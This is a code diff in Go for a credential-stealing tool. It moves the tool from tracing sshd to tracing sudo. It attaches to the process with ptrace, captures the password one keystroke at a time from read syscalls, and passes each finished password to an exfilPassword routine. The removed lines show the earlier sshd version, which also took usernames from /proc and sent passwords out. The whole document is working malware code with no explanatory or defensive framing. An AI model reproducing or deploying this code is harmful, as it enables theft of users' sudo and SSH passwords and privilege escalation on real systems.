@@ -1,15 +1,11 @@
 package main
 
 import (
-	"fmt"
-	"io/ioutil"
-	"regexp"
 	"runtime"
-	"strings"
 	"syscall"
 )
 
-func traceSSHDProcess(pid int) {
+func traceSUDOProcess(pid int) {
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
 	err := syscall.PtraceAttach(pid)
@@ -20,7 +16,8 @@ func traceSSHDProcess(pid int) {
 		syscall.PtraceDetach(pid)
 	}()
 	var wstatus syscall.WaitStatus
-	var exfiled bool
+	var password string
+	var bitFlip bool
 	for {
 		_, err := syscall.Wait4(pid, &wstatus, 0, nil)
 		if err != nil {
@@ -38,28 +35,24 @@ func traceSSHDProcess(pid int) {
 				syscall.PtraceDetach(pid)
 				return
 			}
-
-			if regs.Rdi == 5 && regs.Orig_rax == 1 {
+			if (regs.Rdi == 6 || regs.Rdi == 8) && regs.Orig_rax == 0 {
 				buffer := make([]byte, regs.Rdx)
 				_, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer)
 				if err != nil {
 					return
 				}
-
-				if len(buffer) < 250 && len(buffer) > 5 && string(buffer) != "" {
-					username := "root"
-					cmdline, _ := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
-					matches := regexp.MustCompile(`sshd: ([a-zA-Z]+) \[net\]`).FindSubmatch(cmdline)
-					if len(matches) == 2 {
-						username = string(matches[1])
+				if len(buffer) == 1 {
+					for _, char := range buffer {
+						if char == '\n' {
+							go exfilPassword("root", password)
+							password = ""
+							break
+						} else if char != '\x00' && len(buffer) == 1 && bitFlip {
+							password += string(char)
+						}
 					}
-
-					var password = removeNonPrintableAscii(string(buffer))
-					if len(password) > 2 && len(password) < 100 && exfiled && !strings.HasPrefix(password, "fSHA256") {
-						go exfilPassword(username, removeNonPrintableAscii(password))
-					}
-					exfiled = !exfiled
 				}
+				bitFlip = !bitFlip
 			}
 		}
 
